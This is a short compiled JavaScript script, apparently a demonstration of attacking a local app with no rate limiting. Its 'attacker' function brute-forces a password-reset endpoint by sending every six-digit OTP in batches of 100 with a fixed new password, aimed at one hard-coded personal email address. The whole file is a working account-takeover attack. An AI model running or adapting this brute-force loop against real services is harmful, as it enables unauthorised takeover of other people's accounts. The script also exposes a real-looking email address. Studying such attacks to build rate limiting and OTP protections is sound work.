"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function sendRequest(otp, newPassword) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = JSON.stringify({
            "email": "tanmaybansal.20@gmail.com",
            "otp": otp,
            "newPassword": newPassword
        });
        let config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'http://localhost:3000/reset-password',
            headers: {
                'Content-Type': 'application/json'
            },
            data: data
        };
        try {
            yield axios_1.default.request(config);
        }
        catch (e) {
        }
    });
}
function attacker() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 100000; i < 1000000; i += 100) {
            //batching
            let p = [];
            for (let j = 0; j < 100; j++) {
                p.push(sendRequest((i + j).toString(), "lulululululu"));
            }
            console.log(`Batch ${i} sent`);
            yield Promise.all(p);
        }
    });
}
attacker();
